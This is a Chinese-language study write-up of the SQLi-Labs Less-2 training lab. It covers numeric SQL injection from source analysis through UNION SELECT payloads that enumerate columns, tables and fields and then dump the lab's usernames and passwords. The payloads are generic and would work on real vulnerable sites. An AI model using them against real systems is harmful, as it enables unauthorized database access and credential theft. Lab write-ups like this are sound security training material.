# SQLi-Labs Less-2 复现笔记 🛠️

Less-2 是典型的**数字型 SQL 注入**，核心原因是后端直接将用户输入的 `id` 拼接到 SQL 语句中，未做任何过滤和闭合处理。

---

## 1. 源码分析

```PHP

$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

- `$id` 直接作为数字参数拼接进 SQL，没有用单引号包裹，因此注入时不需要闭合引号。

- 这是判断为**数字型注入**的关键依据。

---

## 2. 注入类型判断

### Payload

```Plain Text

?id=1'
```

### 报错

```Plain Text

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
```

- 报错信息显示，我们添加的单引号 `'` 破坏了 SQL 语法，且没有被闭合，确认是**数字型注入**。

---

## 3. 判断字段列数

使用 `ORDER BY` 子句，通过报错判断表的列数。

### 测试 Payload 1

```Plain Text

?id=1 order by 4--+
```

### 报错

```Plain Text

Unknown column '4' in 'order clause'
```

- 说明列数小于 4。

### 测试 Payload 2

```Plain Text

?id=1 order by 3--+
```

### 结果

页面正常显示数据，无报错。

- 确认 `users` 表共有 **3 列**。

---

## 4. 确认回显位

使用 `UNION SELECT` 语句，让前半部分查询（`id=-1`）返回空集，从而让后半部分的查询结果显示在页面上。

### Payload

```Plain Text

?id=-1 union select 1,2,3--+
```

### 结果

```Plain Text

Your Login name:2
Your Password:3
```

- 说明页面会回显查询结果的第 2、3 列，这两个位置就是我们的注入点。

---

## 5. 爆数据库信息

### 爆数据库版本和当前库名

```Plain Text

?id=-1 union select 1,version(),database()--+
```

- 预期得到 MySQL 版本号（如 `5.7.26`）和当前数据库名（如 `security`）。

---

## 6. 爆表名

从 `information_schema` 中查询当前数据库下的所有表名。

### Payload

```Plain Text

?id=-1 union select 1,version(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+
```

### 预期结果

```Plain Text

emails,referers,uagents,users
```

- 目标表为 `users`。

---

## 7. 爆列名

查询 `users` 表中的所有列名。

### Payload

```Plain Text

?id=-1 union select 1,user(),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')--+
```

### 预期结果

```Plain Text

id,username,password
```

---

## 8. 脱库（获取账号密码）

直接从 `users` 表中提取所有用户名和密码。

### Payload

```Plain Text

?id=-1 union select 1,2,group_concat(username,':',password) from users--+
```

### 预期结果

```Plain Text

Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssw0rd,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le
```

---

## 总结

Less-2 的核心是**数字型注入**，利用 `UNION` 注入可以快速获取数据库信息。整个流程遵循：

1. 判断注入类型 → 2. 判断列数 → 3. 确认回显位 → 4. 爆库 → 5. 爆表 → 6. 爆列 → 7. 脱库。


> （注：文档部分内容可能由 AI 生成）